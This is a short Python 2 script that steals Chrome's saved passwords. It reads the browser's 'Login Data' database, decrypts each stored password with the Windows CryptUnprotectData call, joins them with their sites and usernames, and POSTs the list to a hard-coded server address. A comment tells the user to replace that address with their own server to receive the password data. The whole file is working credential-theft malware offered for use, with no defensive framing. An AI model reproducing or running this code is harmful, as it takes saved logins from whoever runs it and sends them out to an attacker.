#Download and Install Pywin32 from http://sourceforge.net/projects/pywin32/files/pywin32/
#To use this script

from os import getenv
import win32crypt
import sqlite3
import urllib
import urllib2

#Replace this url with your own server to send the password data to
url = 'http://192.168.5.132:8080'


def getChromeTablePath():

	appdata = getenv("APPDATA")
	dbpath = appdata+"\..\Local\Google\Chrome\User Data\Default\Login Data"

	return dbpath

def getDataFromTable(dbPath):
	# Make a database connection
	conn = sqlite3.connect(dbPath)
	cursor = conn.cursor()
	try:
		#  Run query
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
	except:
		print "Some error occured. Try closing chrome if opened"

	return cursor


def getPasswords():
	
	dbPath = getChromeTablePath()
	rows = getDataFromTable(dbPath)
	passdata = []
	for row in rows:
		#refer http://docs.activestate.com/activepython/2.7/pywin32/win32crypt__CryptUnprotectData_meth.html
		passdata.append(row[0]+"::"+row[1]+"::"+win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]+"~~")

	return passdata


def sendovernnetwork(pwds):
	
	values = {'plist' : pwds}    
	data = urllib.urlencode(values)
	req = urllib2.Request(url, data)
	try:
		response = urllib2.urlopen(req)
	except:
		print "Error in connection"
	#no need to check response


if __name__ == "__main__":
    passlist = getPasswords()
    sendovernnetwork(passlist)
    print "Done"